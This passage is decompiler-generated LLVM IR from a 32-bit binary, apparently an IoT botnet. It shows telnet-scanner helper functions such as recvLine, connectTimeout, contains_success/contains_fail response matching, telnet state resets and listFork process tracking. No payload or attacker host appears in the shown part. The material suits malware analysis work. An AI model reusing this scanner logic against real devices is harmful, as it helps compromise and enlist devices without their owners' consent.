  %v2_8049218.pre = load i32, i32* %stack_var_-8, align 4
  %v2_8049219.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8049215

dec_label_pc_8049215:                             ; preds = %dec_label_pc_804920d.dec_label_pc_8049215_crit_edge, %entry
  %v2_8049219 = phi i32 [ %v2_8049219.pre, %dec_label_pc_804920d.dec_label_pc_8049215_crit_edge ], [ %v0_80491b1, %entry ]
  %v2_8049218 = phi i32 [ %v2_8049218.pre, %dec_label_pc_804920d.dec_label_pc_8049215_crit_edge ], [ %v0_80491b4, %entry ]
  %storemerge.lcssa = phi i32 [ %arg2, %dec_label_pc_804920d.dec_label_pc_8049215_crit_edge ], [ 0, %entry ]
  store i32 %v2_8049218, i32* @ebx, align 4
  store i32 %v2_8049219, i32* @ebp, align 4
  ret i32 %storemerge.lcssa

; uselistorder directives
  uselistorder i32 %v4_804920a, { 1, 0 }
  uselistorder i32 %storemerge26, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80491c8, { 1, 0 }
}

define i32 @recvLine(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-177 = alloca i8, align 1
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804921e = load i32, i32* @edi, align 4
  store i32 %v0_804921e, i32* %stack_var_-8, align 4
  %v4_8049228 = ptrtoint i8* %arg2 to i32
  %v1_8049230 = and i32 %v4_8049228, -256
  %v5_8049232 = call i8* @_memset(i8* %arg2, i32 %v1_8049230, i32 %arg3)
  store i32 30, i32* %stack_var_-176, align 4
  %v2_8049252 = ptrtoint i32* %stack_var_-168 to i32
  %tmp32 = bitcast i32* %stack_var_-168 to i8*
  store i32 %v2_8049252, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_8049259 = call i8* @_memset(i8* %tmp32, i32 0, i32 32)
  %v2_8049266 = udiv i32 %arg1, 32
  %v1_804926c = urem i32 %arg1, 32
  %v0_804926f = load i32, i32* @ebp, align 4
  %v2_804926f = mul nuw nsw i32 %v2_8049266, 4
  %v3_804926f = add nsw i32 %v2_804926f, -164
  %v4_804926f = add i32 %v3_804926f, %v0_804926f
  %v5_804926f = inttoptr i32 %v4_804926f to i32*
  %v6_804926f = load i32, i32* %v5_804926f, align 4
  %v9_804926f = shl i32 1, %v1_804926c
  %v12_804926f = or i32 %v6_804926f, %v9_804926f
  store i32 %v12_804926f, i32* %v5_804926f, align 4
  %v1_804927a = add i32 %arg1, 1
  %v2_804927b = ptrtoint i32* %stack_var_-176 to i32
  %v6_80492a4 = call i32 @__libc_select(i32 %v1_804927a, i32 %v2_8049252, i32 0, i32 %v2_8049252, i32 %v2_804927b)
  %tmp33 = icmp slt i32 %v6_80492a4, 1
  %tmp34 = icmp eq i1 %tmp33, false
  br i1 %tmp34, label %dec_label_pc_804935b, label %dec_label_pc_8049351.preheader

dec_label_pc_8049351.preheader:                   ; preds = %entry
  %v7_804935546 = icmp sgt i32 %tmp11, 9
  br i1 %v7_804935546, label %dec_label_pc_804935b, label %dec_label_pc_80492bb

dec_label_pc_80492bb:                             ; preds = %dec_label_pc_8049351.preheader, %dec_label_pc_804934e
  %stack_var_-36.047 = phi i32 [ %v4_804934e, %dec_label_pc_804934e ], [ %tmp11, %dec_label_pc_8049351.preheader ]
  %v0_80492bb = load i32, i32* @global_var_805c520.20, align 32
  %v3_80492cb = call i32 @sockprintf(i32 %v0_80492bb, i32 ptrtoint ([5 x i8]* @global_var_8058937.21 to i32))
  store i32 30, i32* %stack_var_-176, align 4
  store i32 %v2_8049252, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_80492f5 = call i8* @_memset(i8* %tmp32, i32 0, i32 32)
  %v0_804930b = load i32, i32* @ebp, align 4
  %v4_804930b = add i32 %v3_804926f, %v0_804930b
  %v5_804930b = inttoptr i32 %v4_804930b to i32*
  %v6_804930b = load i32, i32* %v5_804930b, align 4
  %v12_804930b = or i32 %v6_804930b, %v9_804926f
  store i32 %v12_804930b, i32* %v5_804930b, align 4
  %v6_8049340 = call i32 @__libc_select(i32 %v1_804927a, i32 %v2_8049252, i32 0, i32 %v2_8049252, i32 %v2_804927b)
  %tmp35 = icmp slt i32 %v6_8049340, 1
  %tmp36 = icmp eq i1 %tmp35, false
  br i1 %tmp36, label %dec_label_pc_804935b, label %dec_label_pc_804934e

dec_label_pc_804934e:                             ; preds = %dec_label_pc_80492bb
  %v4_804934e = add nsw i32 %stack_var_-36.047, 1
  %v7_8049355 = icmp sgt i32 %stack_var_-36.047, 8
  br i1 %v7_8049355, label %dec_label_pc_804935b, label %dec_label_pc_80492bb

dec_label_pc_804935b:                             ; preds = %dec_label_pc_8049351.preheader, %dec_label_pc_80492bb, %dec_label_pc_804934e, %entry
  %v2_804937f = ptrtoint i8* %stack_var_-177 to i32
  br label %dec_label_pc_80493c5

dec_label_pc_804936a:                             ; preds = %dec_label_pc_80493c5
  %v0_804936a = load i32, i32* @global_var_805c520.20, align 32
  %v5_804938c = call i32 @__libc_recv(i32 %v0_804936a, i32 %v2_804937f, i32 1, i32 0)
  %v9_8049391 = icmp eq i32 %v5_804938c, 1
  br i1 %v9_8049391, label %dec_label_pc_80493a8, label %dec_label_pc_8049396

dec_label_pc_8049396:                             ; preds = %dec_label_pc_804936a
  store i8 0, i8* %stack_var_-32.0, align 1
  br label %dec_label_pc_80493e2

dec_label_pc_80493a8:                             ; preds = %dec_label_pc_804936a
  %v3_80493a8 = load i8, i8* %stack_var_-177, align 1
  %v4_80493af = ptrtoint i8* %stack_var_-32.0 to i32
  store i8 %v3_80493a8, i8* %stack_var_-32.0, align 1
  %v5_80493b4 = add i32 %v4_80493af, 1
  %v22_80493b4 = inttoptr i32 %v5_80493b4 to i8*
  %v3_80493b7 = load i8, i8* %stack_var_-177, align 1
  %v10_80493be = icmp eq i8 %v3_80493b7, 10
  br i1 %v10_80493be, label %dec_label_pc_80493d3, label %dec_label_pc_80493c2

dec_label_pc_80493c2:                             ; preds = %dec_label_pc_80493a8
  %v4_80493c2 = add i32 %stack_var_-28.0, 1
  br label %dec_label_pc_80493c5

dec_label_pc_80493c5:                             ; preds = %dec_label_pc_804935b, %dec_label_pc_80493c2
  %stack_var_-32.0 = phi i8* [ %arg2, %dec_label_pc_804935b ], [ %v22_80493b4, %dec_label_pc_80493c2 ]
  %stack_var_-28.0 = phi i32 [ 0, %dec_label_pc_804935b ], [ %v4_80493c2, %dec_label_pc_80493c2 ]
  %stack_var_12.0 = phi i32 [ %arg3, %dec_label_pc_804935b ], [ %v4_80493c5, %dec_label_pc_80493c2 ]
  %v4_80493c5 = add i32 %stack_var_12.0, -1
  %v9_80493c5 = sub i32 0, %stack_var_12.0
  %v10_80493c5 = and i32 %stack_var_12.0, %v9_80493c5
  %v11_80493c5 = icmp slt i32 %v10_80493c5, 0
  %v12_80493c5 = icmp eq i32 %v4_80493c5, 0
  %v13_80493c5 = icmp slt i32 %v4_80493c5, 0
  %v3_80493c9 = icmp eq i1 %v13_80493c5, %v11_80493c5
  %v4_80493c9 = icmp eq i1 %v12_80493c5, false
  %v5_80493c9 = and i1 %v4_80493c9, %v3_80493c9
  %v4_80493cf = icmp eq i1 %v5_80493c9, false
  %v1_80493d1 = icmp eq i1 %v4_80493cf, false
  br i1 %v1_80493d1, label %dec_label_pc_804936a, label %dec_label_pc_80493d3

dec_label_pc_80493d3:                             ; preds = %dec_label_pc_80493a8, %dec_label_pc_80493c5
  %stack_var_-32.1 = phi i8* [ %v22_80493b4, %dec_label_pc_80493a8 ], [ %stack_var_-32.0, %dec_label_pc_80493c5 ]
  store i8 0, i8* %stack_var_-32.1, align 1
  br label %dec_label_pc_80493e2

dec_label_pc_80493e2:                             ; preds = %dec_label_pc_8049396, %dec_label_pc_80493d3
  %storemerge = phi i32 [ -1, %dec_label_pc_8049396 ], [ %stack_var_-28.0, %dec_label_pc_80493d3 ]
  %v2_80493ee = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80493ee, i32* @edi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_80493c5, { 2, 1, 0 }
  uselistorder i32 %stack_var_12.0, { 1, 0, 2 }
  uselistorder i8* %stack_var_-32.0, { 1, 0, 2, 3 }
  uselistorder i8* %v22_80493b4, { 1, 0 }
  uselistorder i32 %v2_8049252, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-176, { 0, 2, 1 }
  uselistorder i8* %stack_var_-177, { 2, 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80493e2, { 1, 0 }
  uselistorder label %dec_label_pc_80493d3, { 1, 0 }
  uselistorder label %dec_label_pc_80493c5, { 1, 0 }
  uselistorder label %dec_label_pc_804935b, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_80492bb, { 1, 0 }
}

define i32 @get_telstate_host() local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v0_80493f1 = load i32, i32* @ebp, align 4
  %v1_80493fa = add i32 %tmp1, 4
  %v2_80493fa = inttoptr i32 %v1_80493fa to i32*
  %v3_80493fa = load i32, i32* %v2_80493fa, align 4
  %v1_8049406 = call i32 @__GI_inet_ntoa(i32 %v3_80493fa)
  store i32 %v0_80493f1, i32* @ebp, align 4
  ret i32 %v1_8049406
}

define i32 @read_until_response(i32 %arg1) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_8049410 = load i32, i32* @edi, align 4
  store i32 %v0_8049410, i32* %stack_var_-8, align 4
  %v1_804941a = inttoptr i32 %tmp8 to i8*
  store i32 %tmp8, i32* @edi, align 4
  %v1_804941f = and i32 %tmp8, -256
  %v5_8049421 = call i8* @_memset(i8* %v1_804941a, i32 %v1_804941f, i32 %tmp9)
  %v4_804943e = call i32 @read_with_timeout(i32 %arg1, i32 %tmp5, i32 %tmp8, i32 %tmp9)
  %v2_8049453 = inttoptr i32 %tmp1 to i32*
  %v3_8049453 = call i32 @contains_string(i32 %tmp8, i32* %v2_8049453)
  %v1_8049458 = icmp ne i32 %v3_8049453, 0
  %storemerge = zext i1 %v1_8049458 to i32
  %v2_8049472 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8049472, i32* @edi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %tmp9, { 1, 0 }
  uselistorder i32 %tmp8, { 4, 3, 0, 2, 1 }
}

define i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  store i32 0, i32* %stack_var_-152, align 4
  %v2_804949c = ptrtoint i32* %stack_var_-144 to i32
  %tmp18 = bitcast i32* %stack_var_-144 to i8*
  store i1 false, i1* @df, align 1
  %v5_80494a3 = call i8* @_memset(i8* %tmp18, i32 0, i32 32)
  %v2_80494b0 = udiv i32 %arg1, 32
  %v1_80494b6 = urem i32 %arg1, 32
  %v0_80494b9 = load i32, i32* @ebp, align 4
  %v2_80494b9 = mul nuw nsw i32 %v2_80494b0, 4
  %v3_80494b9 = add nsw i32 %v2_80494b9, -140
  %v4_80494b9 = add i32 %v3_80494b9, %v0_80494b9
  %v5_80494b9 = inttoptr i32 %v4_80494b9 to i32*
  %v6_80494b9 = load i32, i32* %v5_80494b9, align 4
  %v9_80494b9 = shl i32 1, %v1_80494b6
  %v12_80494b9 = or i32 %v6_80494b9, %v9_80494b9
  store i32 %v12_80494b9, i32* %v5_80494b9, align 4
  %v1_80494c4 = add i32 %arg1, 1
  %v4_80494cb = ptrtoint i32* %stack_var_-152 to i32
  %v5_80494ec = call i32 @__libc_select(i32 %v1_80494c4, i32 %v2_804949c, i32 0, i32 0, i32 %v4_80494cb)
  %tmp19 = icmp slt i32 %v5_80494ec, 1
  %tmp20 = icmp eq i1 %tmp19, false
  br i1 %tmp20, label %dec_label_pc_8049501, label %dec_label_pc_8049528

dec_label_pc_8049501:                             ; preds = %entry
  %v4_804951d = call i32 @__libc_recv(i32 %arg1, i32 %arg3, i32 %arg4, i32 0)
  br label %dec_label_pc_8049528

dec_label_pc_8049528:                             ; preds = %entry, %dec_label_pc_8049501
  %storemerge = phi i32 [ %v4_804951d, %dec_label_pc_8049501 ], [ 0, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %stack_var_-152, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8049528, { 1, 0 }
}

define i32 @advance_state(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp3 = ptrtoint i32* %arg1 to i32
  %v4_804953d = icmp eq i32 %arg2, 0
  %v6_804953d = trunc i32 %arg2 to i8
  %v1_8049541 = icmp eq i1 %v4_804953d, false
  br i1 %v1_8049541, label %dec_label_pc_8049550, label %dec_label_pc_8049543

dec_label_pc_8049543:                             ; preds = %entry
  %v2_8049546 = load i32, i32* %arg1, align 4
  %v1_804954b = call i32 @__libc_close(i32 %v2_8049546)
  br label %dec_label_pc_8049550

dec_label_pc_8049550:                             ; preds = %entry, %dec_label_pc_8049543
  %v1_8049553 = add i32 %tmp3, 16
  %v2_8049553 = inttoptr i32 %v1_8049553 to i32*
  store i32 0, i32* %v2_8049553, align 4
  %v3_8049562 = add i32 %tmp3, 8
  %v4_8049562 = inttoptr i32 %v3_8049562 to i8*
  store i8 %v6_804953d, i8* %v4_8049562, align 1
  %v1_8049568 = add i32 %tmp3, 24
  %v2_8049568 = inttoptr i32 %v1_8049568 to i32*
  %v3_8049568 = load i32, i32* %v2_8049568, align 4
  %v3_8049581 = inttoptr i32 %v3_8049568 to i8*
  %v4_8049581 = call i32 @__GI_memset(i8* %v3_8049581, i32 0, i32 512)
  ret i32 %v4_8049581

; uselistorder directives
  uselistorder i32 %tmp3, { 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8049550, { 1, 0 }
}

define i32 @reset_telstate(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8049588 = load i32, i32* @ebp, align 4
  store i32 %v0_8049588, i32* %stack_var_-4, align 4
  %v2_804959c = inttoptr i32 %arg1 to i32*
  %v3_804959c = call i32 @advance_state(i32* %v2_804959c, i32 0)
  %v1_80495a4 = add i32 %arg1, 9
  %v2_80495a4 = inttoptr i32 %v1_80495a4 to i8*
  store i8 1, i8* %v2_80495a4, align 1
  %v2_80495a8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80495a8, i32* @ebp, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 2, 1, 0 }
}

define i32 @contains_success(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_80495aa = load i32, i32* @ebp, align 4
  store i32 %v0_80495aa, i32* %stack_var_-4, align 4
  %v4_80495aa = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_80495aa, i32* @ebp, align 4
  %v4_80495be = call i32 @contains_string(i32 %arg1, i32* bitcast ([3 x i8*]* @global_var_805c220.25 to i32*))
  %v2_80495c3 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80495c3, i32* @ebp, align 4
  ret i32 %v4_80495be

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
}

define i32 @contains_fail(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_80495c5 = load i32, i32* @ebp, align 4
  store i32 %v0_80495c5, i32* %stack_var_-4, align 4
  %v4_80495c5 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_80495c5, i32* @ebp, align 4
  %v4_80495d9 = call i32 @contains_string(i32 %arg1, i32* bitcast ([7 x i8*]* @global_var_805c200.33 to i32*))
  %v2_80495de = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80495de, i32* @ebp, align 4
  ret i32 %v4_80495d9

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
}

define i32 @contains_response(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_80495e0 = load i32, i32* @ebp, align 4
  store i32 %v0_80495e0, i32* %stack_var_-4, align 4
  %v4_80495e0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_80495e0, i32* @ebp, align 4
  %v1_80495ec = call i32 @contains_success(i32 %arg1)
  %v1_80495f1 = icmp eq i32 %v1_80495ec, 0
  %v1_80495f3 = icmp eq i1 %v1_80495f1, false
  br i1 %v1_80495f3, label %dec_label_pc_8049614, label %dec_label_pc_80495f5

dec_label_pc_80495f5:                             ; preds = %entry
  %v1_80495fb = call i32 @contains_fail(i32 %arg1)
  %v1_8049600 = icmp ne i32 %v1_80495fb, 0
  %. = zext i1 %v1_8049600 to i32
  br label %dec_label_pc_8049614

dec_label_pc_8049614:                             ; preds = %dec_label_pc_80495f5, %entry
  %storemerge = phi i32 [ 1, %entry ], [ %., %dec_label_pc_80495f5 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @contains_string(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp5 = ptrtoint i32* %arg2 to i32
  %stack_var_-4 = alloca i32, align 4
  %v0_8049619 = load i32, i32* @ebp, align 4
  store i32 %v0_8049619, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8049634

dec_label_pc_8049634:                             ; preds = %dec_label_pc_8049634, %entry
  %stack_var_-12.0 = phi i32 [ 0, %entry ], [ %v4_8049634, %dec_label_pc_8049634 ]
  %v4_8049634 = add i32 %stack_var_-12.0, 1
  %v2_804963a = mul i32 %v4_8049634, 4
  %v5_804963d = add i32 %v2_804963a, %tmp5
  %v1_8049640 = inttoptr i32 %v5_804963d to i32*
  %v2_8049640 = load i32, i32* %v1_8049640, align 4
  %v1_8049642 = icmp eq i32 %v2_8049640, 0
  %v1_8049644 = icmp eq i1 %v1_8049642, false
  br i1 %v1_8049644, label %dec_label_pc_8049634, label %dec_label_pc_8049679.preheader

dec_label_pc_8049679.preheader:                   ; preds = %dec_label_pc_8049634
  %v2_8049664 = inttoptr i32 %arg1 to i8*
  %v5_804967f17 = icmp sgt i32 %v4_8049634, 0
  br i1 %v5_804967f17, label %dec_label_pc_804964f, label %dec_label_pc_8049688

dec_label_pc_804964f:                             ; preds = %dec_label_pc_8049679.preheader, %dec_label_pc_8049676
  %storemerge118 = phi i32 [ %v4_8049676, %dec_label_pc_8049676 ], [ 0, %dec_label_pc_8049679.preheader ]
  %v2_8049652 = mul i32 %storemerge118, 4
  %v5_8049655 = add i32 %v2_8049652, %tmp5
  %v1_8049658 = inttoptr i32 %v5_8049655 to i32*
  %v2_8049658 = load i32, i32* %v1_8049658, align 4
  store i32 %arg1, i32* @eax, align 4
  %v3_8049664 = call i32 @strcasestr(i8* %v2_8049664, i32 %v2_8049658)
  %v1_8049669 = icmp eq i32 %v3_8049664, 0
  br i1 %v1_8049669, label %dec_label_pc_8049676, label %dec_label_pc_8049688

dec_label_pc_8049676:                             ; preds = %dec_label_pc_804964f
  %v4_8049676 = add nuw nsw i32 %storemerge118, 1
  %v5_804967f = icmp slt i32 %v4_8049676, %v4_8049634
  br i1 %v5_804967f, label %dec_label_pc_804964f, label %dec_label_pc_8049688

dec_label_pc_8049688:                             ; preds = %dec_label_pc_804964f, %dec_label_pc_8049676, %dec_label_pc_8049679.preheader
  %storemerge = phi i32 [ 0, %dec_label_pc_8049679.preheader ], [ 0, %dec_label_pc_8049676 ], [ 1, %dec_label_pc_804964f ]
  %v2_804968b = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804968b, i32* @ebp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_8049676, { 1, 0 }
  uselistorder i32 %storemerge118, { 1, 0 }
  uselistorder i32 %v4_8049634, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_8049688, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804964f, { 1, 0 }
}

define i32 @connectTimeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8049690 = load i32, i32* @edi, align 4
  store i32 %v0_8049690, i32* %stack_var_-8, align 4
  %v3_80496ad = call i32 @__libc_fcntl(i32 %arg1, i32 3, i32 0)
  %v4_80496b5 = or i32 %v3_80496ad, 2048
  %v3_80496d1 = call i32 @__libc_fcntl(i32 %arg1, i32 4, i32 %v4_80496b5)
  store i32 2, i32* %stack_var_-40, align 4
  %v1_80496e5 = trunc i32 %arg3 to i16
  %v2_80496e5 = call i32 @htons(i16 %v1_80496e5)
  store i32 %arg2, i32* @edx, align 4
  %v3_8049701 = call i32 @getHost(i32 %arg2, i32* nonnull %stack_var_-36)
  %v1_8049706 = icmp eq i32 %v3_8049701, 0
  br i1 %v1_8049706, label %dec_label_pc_8049719, label %dec_label_pc_8049889

dec_label_pc_8049719:                             ; preds = %entry
  %v2_80496f4 = ptrtoint i32* %stack_var_-40 to i32
  %v3_8049741 = call i32 @__libc_connect(i32 %arg1, i32 %v2_80496f4, i32 16)
  %v5_8049749 = icmp slt i32 %v3_8049741, 0
  %v1_804974d = icmp eq i1 %v5_8049749, false
  br i1 %v1_804974d, label %dec_label_pc_8049840, label %dec_label_pc_8049753

dec_label_pc_8049753:                             ; preds = %dec_label_pc_8049719
  %v1_8049753 = call i32 @__errno_location(i32 %v3_8049741)
  %v1_8049758 = inttoptr i32 %v1_8049753 to i32*
  %v2_8049758 = load i32, i32* %v1_8049758, align 4
  %v9_804975a = icmp eq i32 %v2_8049758, 115
  %v1_804975d = icmp eq i1 %v9_804975a, false
  br i1 %v1_804975d, label %dec_label_pc_8049889, label %dec_label_pc_8049763

dec_label_pc_8049763:                             ; preds = %dec_label_pc_8049753
  store i32 %arg4, i32* %stack_var_-176, align 4
  %v2_8049780 = ptrtoint i32* %stack_var_-168 to i32
  %tmp27 = bitcast i32* %stack_var_-168 to i8*
  store i32 %v2_8049780, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_8049787 = call i8* @_memset(i8* %tmp27, i32 0, i32 32)
  %v2_8049794 = udiv i32 %arg1, 32
  %v1_804979a = urem i32 %arg1, 32
  %v0_804979d = load i32, i32* @ebp, align 4
  %v2_804979d = mul nuw nsw i32 %v2_8049794, 4
  %v3_804979d = add nsw i32 %v2_804979d, -164
  %v4_804979d = add i32 %v3_804979d, %v0_804979d
  %v5_804979d = inttoptr i32 %v4_804979d to i32*
  %v6_804979d = load i32, i32* %v5_804979d, align 4
  %v9_804979d = shl i32 1, %v1_804979a
  %v12_804979d = or i32 %v6_804979d, %v9_804979d
  store i32 %v12_804979d, i32* %v5_804979d, align 4
  %v1_80497a8 = add i32 %arg1, 1
  %v2_80497a9 = ptrtoint i32* %stack_var_-176 to i32
  %v5_80497d0 = call i32 @__libc_select(i32 %v1_80497a8, i32 0, i32 %v2_8049780, i32 0, i32 %v2_80497a9)
  %tmp28 = icmp slt i32 %v5_80497d0, 1
  br i1 %tmp28, label %dec_label_pc_8049889, label %dec_label_pc_80497d9

dec_label_pc_80497d9:                             ; preds = %dec_label_pc_8049763
  store i32 4, i32* %stack_var_-180, align 4
  %v2_80497e3 = ptrtoint i32* %stack_var_-180 to i32
  %v2_80497ed = ptrtoint i32* %stack_var_-184 to i32
  %v5_804980d = call i32 @getsockopt(i32 %arg1, i32 1, i32 4, i32 %v2_80497ed, i32 %v2_80497e3)
  %v3_8049812 = load i32, i32* %stack_var_-184, align 4
  %v1_8049818 = icmp eq i32 %v3_8049812, 0
  br i1 %v1_8049818, label %dec_label_pc_8049840, label %dec_label_pc_8049889

dec_label_pc_8049840:                             ; preds = %dec_label_pc_80497d9, %dec_label_pc_8049719
  %v3_8049856 = call i32 @__libc_fcntl(i32 %arg1, i32 3, i32 0)
  %v4_804985e = and i32 %v3_8049856, -2049
  %v3_804987a = call i32 @__libc_fcntl(i32 %arg1, i32 4, i32 %v4_804985e)
  br label %dec_label_pc_8049889

dec_label_pc_8049889:                             ; preds = %dec_label_pc_8049753, %dec_label_pc_8049763, %dec_label_pc_80497d9, %entry, %dec_label_pc_8049840
  %stack_var_-188.0 = phi i32 [ 1, %dec_label_pc_8049840 ], [ 0, %entry ], [ 0, %dec_label_pc_80497d9 ], [ 0, %dec_label_pc_8049763 ], [ 0, %dec_label_pc_8049753 ]
  %v2_8049895 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8049895, i32* @edi, align 4
  ret i32 %stack_var_-188.0

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_-176, { 1, 0 }
  uselistorder i32* %stack_var_-180, { 1, 0 }
  uselistorder i32 %arg1, { 8, 7, 6, 5, 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_8049889, { 4, 2, 1, 0, 3 }
}

define i32 @listFork() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_804989b = load i32, i32* @ebx, align 4
  store i32 %v0_804989b, i32* %stack_var_-8, align 4
  %v1_804989f = call i32 @__libc_fork(i32 %v0_804989b)
  %v4_80498a7 = icmp eq i32 %v1_804989f, 0
  %v1_80498ab = icmp eq i1 %v4_80498a7, false
  br i1 %v1_80498ab, label %dec_label_pc_80498b8, label %dec_label_pc_80498ad

dec_label_pc_80498ad:                             ; preds = %entry
  br label %dec_label_pc_8049994

dec_label_pc_80498b8:                             ; preds = %entry
  %v0_80498b8 = load i32, i32* @global_var_805c528.34, align 8
  %v0_80498bd = load i32, i32* @global_var_805c52c.35, align 4
  %v1_80498c3 = add i32 %v0_80498b8, 1
  %v5_80498c3 = icmp eq i32 %v0_80498b8, -1
  %v2_80498c6 = zext i1 %v5_80498c3 to i32
  %v3_80498c6 = add i32 %v2_80498c6, %v0_80498bd
  store i32 %v1_80498c3, i32* @global_var_805c528.34, align 8
  store i32 %v3_80498c6, i32* @global_var_805c52c.35, align 4
  %v2_80498e3 = mul i32 %v1_80498c3, 4
  %v1_80498e6 = add i32 %v2_80498e3, 4
  %v1_80498ec = call i32 @malloc(i32 %v1_80498e6)
  br label %dec_label_pc_804991f

dec_label_pc_80498fd:                             ; preds = %dec_label_pc_804991f, %dec_label_pc_8049950
  %v2_8049900 = mul i32 %storemerge1, 4
  %v5_8049905 = add i32 %v2_8049900, %v1_80498ec
  %v0_8049910 = load i32, i32* @global_var_80627b4.36, align 4
  %v2_8049915 = add i32 %v0_8049910, %v2_8049900
  %v1_8049918 = inttoptr i32 %v2_8049915 to i32*
  %v2_8049918 = load i32, i32* %v1_8049918, align 4
  %v2_804991a = inttoptr i32 %v5_8049905 to i32*
  store i32 %v2_8049918, i32* %v2_804991a, align 4
  %v4_804991c = add i32 %storemerge1, 1
  br label %dec_label_pc_804991f

dec_label_pc_804991f:                             ; preds = %dec_label_pc_80498b8, %dec_label_pc_80498fd
  %storemerge1 = phi i32 [ %v4_804991c, %dec_label_pc_80498fd ], [ 0, %dec_label_pc_80498b8 ]
  %v0_804992d = load i32, i32* @global_var_805c528.34, align 8
  %v0_8049932 = load i32, i32* @global_var_805c52c.35, align 4
  %v4_804993c = icmp ne i32 %v0_804992d, 0
  %v2_804993f = zext i1 %v4_804993c to i32
  %v3_804993f = add i32 %v0_8049932, -1
  %v4_804993f = add i32 %v3_804993f, %v2_804993f
  store i32 %v4_804993f, i32* @ebx, align 4
  %v10_804994b = icmp eq i32 %v4_804993f, 0
  br i1 %v10_804994b, label %dec_label_pc_8049950, label %dec_label_pc_80498fd

dec_label_pc_8049950:                             ; preds = %dec_label_pc_804991f
  %v1_804993c = add i32 %v0_804992d, -1
  %v10_804995b = icmp ult i32 %storemerge1, %v1_804993c
  br i1 %v10_804995b, label %dec_label_pc_80498fd, label %dec_label_pc_8049960

dec_label_pc_8049960:                             ; preds = %dec_label_pc_8049950
  %v2_804996b = mul i32 %v0_804992d, 4
  %v5_804996e = add i32 %v2_804996b, %v1_80498ec
  %v1_8049971 = add i32 %v5_804996e, -4
  store i32 %v1_8049971, i32* @edx, align 4
  %v2_8049977 = inttoptr i32 %v1_8049971 to i32*
  store i32 %v1_804989f, i32* %v2_8049977, align 4
  %v0_8049979 = load i32, i32* @global_var_80627b4.36, align 4
  %v1_8049981 = call i32 @free(i32 %v0_8049979)
  store i32 %v1_80498ec, i32* @global_var_80627b4.36, align 4
  store i32 %v1_804989f, i32* @ecx, align 4
  br label %dec_label_pc_8049994

dec_label_pc_8049994:                             ; preds = %dec_label_pc_80498ad, %dec_label_pc_8049960
  %v2_804999a = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804999a, i32* @ebx, align 4
  ret i32 %v1_804989f

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 0, 2 }
  uselistorder i32 %v2_8049900, { 1, 0 }
